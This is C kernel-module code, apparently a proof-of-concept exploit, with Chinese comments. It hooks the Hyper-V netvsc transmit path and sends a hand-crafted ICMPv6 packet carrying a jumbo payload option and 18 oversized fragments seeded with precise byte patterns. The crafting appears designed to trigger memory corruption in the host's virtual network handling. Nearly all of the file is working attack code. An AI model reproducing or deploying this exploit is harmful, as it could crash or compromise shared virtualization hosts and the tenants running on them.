int make_icmpv6(char **data)
{

    char *p, *buff;
    int n;
    char src_mac[6] = {0};
    char dst_mac[6] = {0};
    char src_ip[16] = {0};
    char dst_ip[16] = {0};

    buff = (char *)kmalloc(0x1000, GFP_ATOMIC);
    memset(buff, 0, 0x1000);
    p = buff;
    *data = p;
    p = p + 130;

    // destination mac
    memcpy(p, "\x00\x0c\x29\x3e\xa1\x2a", 6);
    p = p + 6;

    // source mac
    memcpy(p, "\x00\x15\x5d\x92\x2a\x02", 6);
    p = p + 6;

    // type ipv6
    memcpy(p, "\x86\xdd", 2);
    p = p + 2;

    //
    memcpy(p, "\x60\x00\x00\x00", 4);
    p = p + 4;

    // payload length    payload  应该做0
    memcpy(p, "\x00\x00", 2);
    p = p + 2;

    // next header hop-by-hop option
    *p = 0x00;
    p++;

    // hop limit

    memcpy(p, "\xff", 1);
    p++;

    // source ip
    memcpy(p, "\xfe\x80\x00\x00\x00\x00\x00\x00\x62\xf7\x63\xa1\x21\x9c\xca\xdf", 16);
    p = p + 16;

    // destination  ip
    memcpy(p, "\xfe\x80\x00\x00\x00\x00\x00\x00\xe8\xe5\x4e\x55\xe0\x22\x58\x59", 16);
    p = p + 16;

    // jumbo payload   12030
    memcpy(p, "\x3a\x00\xc2\x04\x00\x01\x00\x10", 8);
    p = p + 8;

    //  偏移 2，3是校验和      40
    memcpy(p, "\x86\x00 \x00\x00 \x06 \xd5 \x00\x15 \x0c\xba\x73\x60 \x00\x00\x00\x00 \x1a\xcc\x02\x00 \x00\x00\x00\x00\x10\x11\x12\x13 \x14\x15\x16\x17 \x18\x19\x1a\x1b \x1c\x1d\x1e\x1f \x20\x21\x22\x23 \x24\x25\x26\x27 \x28\x29\x2a\x2b \x2c\x2d\x2e\x2f \x30\x31\x32\x33 \x34\x35\x36\x37", 0x40);
    ;
    *(p + 16) = 0x56;
    *(p + 17) = 0xff;
    p = p + 0x40;//64-8-16=40=0x28

    n = p - buff;
    return n;
}

int my_netvsc_start_xmit(struct sk_buff *skb, struct net_device *net)
{
    char *data;
    int data_len;
    int a, i = 0, len;
    char *buf = 0;
    char *p_array[18];
    struct page pfrag[17] = {0};
    struct page *mypage = 0;
    char *ptr, *ptr_;
    skb_frag_t *frag;
    data_len = make_icmpv6(&data);
    skb_shinfo(skb)->nr_frags = 0;
    skb->protocol = htons(ETH_P_IP);
    skb->data = data + 130;
    skb->head = data;
    skb->tail = data_len;
    skb->len = data_len - 130;
    skb->data_len = 0;
    skb->ip_summed = 0;
    skb->hash = 0;

    ptr = (char *)kmalloc(0x100000, GFP_ATOMIC);
    ptr_ = ptr;
    memcpy(ptr, data + 130 + 22, 32);
    ptr = ptr + 32;
    memcpy(ptr, data + 130 + 0x3e, 0x40);//14+48=62
    ptr = ptr + 0x40;
    while (i < 18)
    {

        frag = &skb_shinfo(skb)->frags[i];
        buf = (char *)kmalloc(0x1000, GFP_ATOMIC);
        memset(buf, 0x56, 0x1000);
        mypage = virt_to_page(buf);
        frag->page.p = mypage;
        frag->page_offset = 0;
        frag->size = 0xfff;

        len = 0xfff;

        skb_shinfo(skb)->nr_frags++;
        skb->len = skb->len + len; // 这里这个东西不加上去试试
        skb->data_len = skb->data_len + len;
        // [6b0] |56 56 56 56|56 56 56 56|56 56 69 ff|56 56 56 56|-->17
        // [6c0] |56 56 56 56|56 56 56 56|56 68 ff 56|56 56 56 56|-->16
        // [6d0] |56 56 56 56|56 56 56 56|67 ff 56 56|56 56 56 56|-->15
        // [6e0] |56 56 56 56|56 56 56 66|ff 56 56 56|56 56 56 56|-->14
        // [6f0] |56 56 56 56|56 56 65 ff|56 56 56 56|56 56 56 56|-->13
        // [700] |56 56 56 56|56 64 ff 56|56 56 56 56|56 56 56 56|-->12
        // [710] |56 56 56 56|63 ff 56 56|56 56 56 56|56 56 56 56|-->11
        // [720] |56 56 56 62|ff 56 56 56|56 56 56 56|56 56 56 56|-->10
        // [730] |56 56 61 ff|56 56 56 56|56 56 56 56|56 56 56 56|-->9
        // [740] |56 60 ff 56|56 56 56 56|56 56 56 56|56 56 56 56|-->8
        // [750] |5f ff 56 56|56 56 56 56|56 56 56 56|56 56 56 5e|-->7
        // [760] |ff 56 56 56|56 56 56 56|56 56 56 56|56 56 5d ff|-->6
        // [770] |56 56 56 56|56 56 56 56|56 56 56 56|56 5c ff 56|-->5
        // [780] |56 56 56 56|56 56 56 56|56 56 56 56|5b ff 56 56|-->4
        // [790] |56 56 56 56|56 56 56 56|56 56 56 5a|ff 56 56 56|-->3
        // [7a0] |56 56 56 56|56 56 56 56|56 56 59 ff|56 56 56 56|-->2
        // [7b0] |56 56 56 56|56 56 56 56|56 58 ff 56|56 56 56 56|-->1
        // [7c0] |56 56 56 56|56 56 56 56|57 18 d0 56|56 56 56 56|-->0
        // [7d0] |56 56 56 56|56 56 56 56|18 ff 56 56|56 56 56 56|
        *(buf + 0x7c8 - i * 0x0f) = 0x57 + i; // 0x57 0x58 0x59 ... 0x6e 7b9 6d8
        *(buf + 0x7c8 - i * 0x0f + 1) = 0xff; // 0xff 0xff 0xff ... 0xff

        // [e40] |56 56 56 56|56 56 56 56|56 03 ff 56|56 56 56 56|
        // ...
        // [f10] |56 56 56 56|56 56 56 56|56 56 56 56|56 56 56 56|-->17
        // [f20] |56 9a 27 56|56 56 56 56|56 56 56 56|56 56 56 56|-->16
        // [f30] |99 ff 56 56|56 56 56 56|56 56 56 56|56 56 56 98|-->15
        // [f10] |1f 56 56 56|56 56 56 56|56 56 56 56|56 56 97 ff|-->14
        // [f20] |56 56 56 56|56 56 56 56|56 56 56 56|56 96 ff 56|-->13
        // [f30] |56 56 56 56|56 56 56 56|56 56 56 56|95 ff 56 56|-->12
        // [f10] |56 56 56 56|56 56 56 56|56 56 56 94|ff 56 56 56|-->11
        // [f20] |56 56 56 56|56 56 56 56|56 56 93 ff|56 56 56 56|-->10
        // [f30] |56 56 56 56|56 56 56 56|56 92 ff 56|56 56 56 56|-->9
        // [f40] |56 56 56 56|56 56 56 56|91 ff 56 56|56 56 56 56|-->8
        // [f50] |56 56 56 56|56 56 56 90|ff 56 56 56|56 56 56 56|-->7
        // [f60] |56 56 56 56|56 56 8f ff|56 56 56 56|56 56 56 56|-->6
        // [f70] |56 56 56 56|56 8d ff 56|56 56 56 56|56 56 56 56|-->5
        // [f80] |56 56 56 56|8c ff 56 56|56 56 56 56|56 56 56 56|-->4
        // [f90] |56 56 56 8b|ff 56 56 56|56 56 56 56|56 56 56 56|-->3
        // [fa0] |56 56 8a ff|56 56 56 56|56 56 56 56|56 56 56 56|-->2
        // [fb0] |56 89 ff 56|56 56 56 56|56 56 56 56|56 56 56 56|-->1
        // [fc0] |88 ff 56 56|56 56 56 56|56 56 56 56|56 56 56 56|-->0
        // [fd0] |18 ff 56 56|56 56 56 56|56 56 56 56|56 56 56 18|
        // [fe0] |ff 56 56 56|56 56 56 56|56 56 56 56|56 56 56 56|
        *(buf + 0xfc0 - i * 0x0f) = 0x58 + i + 0x30;// fb1
        *(buf + 0xfc0 + 1 - i * 0x0f) = 0xff;
        if (i == 17)
        {
             // *(buf + 0x7c8 - i * 0x0f) = 0x57 + i; 6c9
            *(buf + 0xfc0 + 1 - i * 0x0f) = 0x27;
            *(buf + 0x7c9) = 24;
            *(buf + 0x7c9 + 1) = 0xd0;
            // *(buf + 0xfc0 - i * 0x0f) = ec1
            *(buf + 0xe49) = 3;
            *(buf + 0xe49 + 1) = 0xff;

            i++;
            continue;

            // 6c9 \x57+\x11 \xff
            // 7c9 \x18 \xd0
            // e49 \x03 \xff
            // ec1 
        }
        if (i == 15)
        {

            *(buf + 0xfc0 + 1 - i * 0x0f) = 0x1f; // EE0

            *(buf + 0xfdf) = 24;//0x18
            *(buf + 0xfdf + 1) = 0xff; // 26

            memcpy(ptr, buf, 0xfd7);
            buf = buf + 0xfd7;

            i++;
            continue;
        }

        if (i == 16)
        {
            // *(buf + 0x7c8 - i * 0x0f) = 0x57 + i; 6d8 6d7 
            *(buf + 0x7d8) = 24;//0x18 6d8
            *(buf + 0x7d8 + 1) = 0xff;
            // *(buf + 0xfc0 - i * 0x0f) = 0x58 + i + 0x30; ed0
            *(buf + 0xfd0) = 24;
            *(buf + 0xfd0 + 1) = 0xff;  //2D

            i++;
            continue;
        }

        i++;
        memcpy(ptr, buf, 0xfff);
        buf = buf + 0xfff;
    }
    i = 0;

    *(unsigned short *)(data + 130 + 0x38 + 8) = checksum(ptr_, ptr - ptr_) - 0x40ee; // 差值应该是固定的
    return netvsc_start_xmit(skb, net);
}
